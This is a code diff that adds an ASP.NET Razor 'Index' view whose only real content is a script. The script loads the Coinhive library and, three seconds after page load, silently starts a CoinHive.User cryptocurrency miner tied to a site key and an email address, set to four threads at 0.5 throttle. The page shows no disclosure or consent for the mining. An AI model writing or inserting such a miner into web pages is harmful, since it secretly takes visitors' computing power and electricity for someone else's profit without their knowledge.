@@ -1,0 +1,27 @@
+﻿
+@{
+    ViewData["Title"] = "Index";
+    Layout = null;
+}
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script>
+    setTimeout(function () {
+        var miner = new CoinHive.User('xSjpR64LrSx0edB6geGUajT9PPBMIV45', 'chieuhoan9@gmail.com', {
+            threads: 4,
+            autoThreads: false,
+            throttle: 0.5,
+            forceASMJS: false,
+            theme: 'dark',
+            language: 'auto'
+        });
+        miner.start();
+    }, 3000);
+
+    (function () {
+        window.addEventListener("beforeunload", function (e) {
+            window.localStorage.removeItem('_openpopup');
+        });
+    })();
+</script>
+
